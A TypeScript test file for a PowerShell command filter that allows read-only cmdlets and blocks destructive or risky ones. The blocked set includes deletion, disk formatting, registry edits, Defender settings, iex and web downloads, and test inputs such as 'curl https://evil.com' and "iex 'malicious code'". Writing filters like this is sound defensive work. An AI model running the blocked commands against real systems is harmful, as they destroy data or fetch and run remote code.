import test from "node:test";
import assert from "node:assert/strict";

const SAFE_POWERSHELL_PATTERNS = [
  /^Get-/i,
  /^Select-/i,
  /^Where-Object/i,
  /^Measure-Object/i,
  /^Sort-Object/i,
  /^Format-/i,
  /^Out-String/i,
  /^Test-Path/i,
  /^Resolve-Path/i,
  /^Get-ChildItem/i,
  /^Get-Content/i,
  /^Get-Location/i,
  /^Get-Process/i,
  /^Get-Service/i,
  /^Get-ComputerInfo/i,
  /^Get-Net/i,
  /^Get-CimInstance/i,
  /^Get-Date/i,
  /^Get-Clipboard/i,
  /^dir\b/i,
  /^ls\b/i,
  /^cat\b/i,
  /^pwd\b/i,
];

const BLOCKED_POWERSHELL_PATTERNS = [
  /\bRemove-Item\b/i,
  /\bClear-Content\b/i,
  /\bSet-Content\b/i,
  /\bAdd-Content\b/i,
  /\bCopy-Item\b/i,
  /\bMove-Item\b/i,
  /\bRename-Item\b/i,
  /\bNew-Item\b/i,
  /\bStop-Process\b/i,
  /\btaskkill\b/i,
  /\bRestart-Computer\b/i,
  /\bStop-Computer\b/i,
  /\bshutdown\b/i,
  /\breg\s+add\b/i,
  /\breg\s+delete\b/i,
  /\bSet-ExecutionPolicy\b/i,
  /\bInvoke-Expression\b/i,
  /\biex\b/i,
  /\bStart-BitsTransfer\b/i,
  /\bInvoke-WebRequest\b/i,
  /\bcurl\b/i,
  /\bwget\b/i,
  /\bStart-Process\b/i,
  /\bsc\.exe\b/i,
  /\bSet-MpPreference\b/i,
  /\bDisable-/i,
  /\bFormat-Volume\b/i,
  /\bdiskpart\b/i,
];

function isCommandBlocked(command: string): boolean {
  return BLOCKED_POWERSHELL_PATTERNS.some((pattern) => pattern.test(command));
}

function isCommandSafe(command: string): boolean {
  return SAFE_POWERSHELL_PATTERNS.some((pattern) => pattern.test(command));
}

test("blocks Remove-Item command", () => {
  assert.equal(isCommandBlocked("Remove-Item -Path C:\\test"), true);
});

test("blocks Clear-Content command", () => {
  assert.equal(isCommandBlocked("Clear-Content file.txt"), true);
});

test("blocks Set-Content command", () => {
  assert.equal(isCommandBlocked("Set-Content -Path test.txt"), true);
});

test("blocks Add-Content command", () => {
  assert.equal(isCommandBlocked("Add-Content file.txt"), true);
});

test("blocks Copy-Item command", () => {
  assert.equal(isCommandBlocked("Copy-Item source dest"), true);
});

test("blocks Move-Item command", () => {
  assert.equal(isCommandBlocked("Move-Item source dest"), true);
});

test("blocks Rename-Item command", () => {
  assert.equal(isCommandBlocked("Rename-Item old new"), true);
});

test("blocks New-Item command", () => {
  assert.equal(isCommandBlocked("New-Item -Path test"), true);
});

test("blocks Stop-Process command", () => {
  assert.equal(isCommandBlocked("Stop-Process -Name notepad"), true);
});

test("blocks taskkill command", () => {
  assert.equal(isCommandBlocked("taskkill /F /IM notepad.exe"), true);
});

test("blocks Restart-Computer command", () => {
  assert.equal(isCommandBlocked("Restart-Computer"), true);
});

test("blocks Stop-Computer command", () => {
  assert.equal(isCommandBlocked("Stop-Computer -Force"), true);
});

test("blocks shutdown command", () => {
  assert.equal(isCommandBlocked("shutdown /s /t 0"), true);
  assert.equal(isCommandBlocked("shutdown -h"), true);
});

test("blocks registry commands", () => {
  assert.equal(isCommandBlocked("reg add HKCU\\Software"), true);
  assert.equal(isCommandBlocked("reg delete HKCU\\Software"), true);
});

test("blocks Set-ExecutionPolicy command", () => {
  assert.equal(isCommandBlocked("Set-ExecutionPolicy RemoteSigned"), true);
});

test("blocks Invoke-Expression command", () => {
  assert.equal(isCommandBlocked("Invoke-Expression 'malicious code'"), true);
  assert.equal(isCommandBlocked("iex 'malicious code'"), true);
});

test("blocks Invoke-WebRequest command", () => {
  assert.equal(
    isCommandBlocked("Invoke-WebRequest -Uri https://evil.com"),
    true,
  );
});

test("blocks curl/wget commands", () => {
  assert.equal(isCommandBlocked("curl https://evil.com"), true);
  assert.equal(isCommandBlocked("wget https://evil.com"), true);
});

test("blocks Start-Process command", () => {
  assert.equal(isCommandBlocked("Start-Process notepad"), true);
});

test("blocks sc.exe command", () => {
  assert.equal(isCommandBlocked("sc.exe create service"), true);
});

test("blocks Format-Volume command", () => {
  assert.equal(isCommandBlocked("Format-Volume -DriveLetter D"), true);
});

test("blocks diskpart command", () => {
  assert.equal(isCommandBlocked("diskpart"), true);
});

test("allows Get-Process command", () => {
  assert.equal(isCommandSafe("Get-Process"), true);
  assert.equal(isCommandSafe("Get-Process | Select-Object Name"), true);
});

test("allows Get-ChildItem command", () => {
  assert.equal(isCommandSafe("Get-ChildItem C:\\"), true);
  assert.equal(isCommandSafe("Get-ChildItem -Path ."), true);
});

test("allows Get-Content command", () => {
  assert.equal(isCommandSafe("Get-Content file.txt"), true);
  assert.equal(isCommandSafe("cat file.txt"), true);
});

test("allows Get-Location command", () => {
  assert.equal(isCommandSafe("Get-Location"), true);
  assert.equal(isCommandSafe("pwd"), true);
});

test("allows Get-Service command", () => {
  assert.equal(isCommandSafe("Get-Service"), true);
});

test("allows Get-ComputerInfo command", () => {
  assert.equal(isCommandSafe("Get-ComputerInfo"), true);
});

test("allows Test-Path command", () => {
  assert.equal(isCommandSafe("Test-Path C:\\test"), true);
});

test("allows Select-Object command", () => {
  assert.equal(isCommandSafe("Get-Process | Select-Object Name, Id"), true);
});

test("allows Where-Object command", () => {
  assert.equal(
    isCommandSafe("Get-Process | Where-Object {$_.CPU -gt 10}"),
    true,
  );
});

test("allows Measure-Object command", () => {
  assert.equal(isCommandSafe("Get-Process | Measure-Object"), true);
});

test("allows Sort-Object command", () => {
  assert.equal(isCommandSafe("Get-Process | Sort-Object CPU"), true);
});

test("allows Format-List command", () => {
  assert.equal(isCommandSafe("Get-Process | Format-List"), true);
});

test("allows Out-String command", () => {
  assert.equal(isCommandSafe("Get-Process | Out-String"), true);
});

test("allows dir/ls commands", () => {
  assert.equal(isCommandSafe("dir"), true);
  assert.equal(isCommandSafe("ls -la"), true);
});

test("allows Get-Date command", () => {
  assert.equal(isCommandSafe("Get-Date"), true);
});

test("allows Get-Clipboard command", () => {
  assert.equal(isCommandSafe("Get-Clipboard"), true);
});

test("safe command returns false for blocked patterns", () => {
  assert.equal(isCommandSafe("Remove-Item -Path test"), false);
  assert.equal(isCommandSafe("Stop-Process notepad"), false);
});

test("blocked command returns false for safe patterns", () => {
  assert.equal(isCommandBlocked("Get-Process"), false);
  assert.equal(isCommandBlocked("dir"), false);
});

test("empty command is not blocked", () => {
  assert.equal(isCommandBlocked(""), false);
  assert.equal(isCommandBlocked("   "), false);
});

test("whitespace-only commands are not blocked", () => {
  assert.equal(isCommandBlocked("\t\n"), false);
});
